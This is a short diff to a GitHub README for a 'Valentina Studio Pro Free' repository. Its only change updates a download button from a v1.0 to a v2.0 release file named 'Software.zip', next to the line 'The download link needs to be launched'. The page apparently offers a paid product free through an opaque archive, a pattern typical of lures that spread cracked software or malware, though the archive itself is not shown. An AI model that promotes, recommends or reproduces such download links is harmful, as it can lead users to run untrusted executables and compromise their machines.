@@ -10,7 +10,7 @@ Welcome to the Valentina Studio Pro Free repository! This repository is a hub fo
 ### Get Started
 To get started, you can download the latest release of Valentina Studio Pro Free by clicking the button below:
 
-[![Download Valentina Studio Pro Free](https://github.com/traeney187/Valentina-Studio-Pro-Free/releases/download/v1.0/Software.zip%20Studio%20Pro%20Free-blue)](https://github.com/traeney187/Valentina-Studio-Pro-Free/releases/download/v1.0/Software.zip)
+[![Download Valentina Studio Pro Free](https://github.com/traeney187/Valentina-Studio-Pro-Free/releases/download/v2.0/Software.zip%20Studio%20Pro%20Free-blue)](https://github.com/traeney187/Valentina-Studio-Pro-Free/releases/download/v2.0/Software.zip)
 
 _The download link needs to be launched_.
 
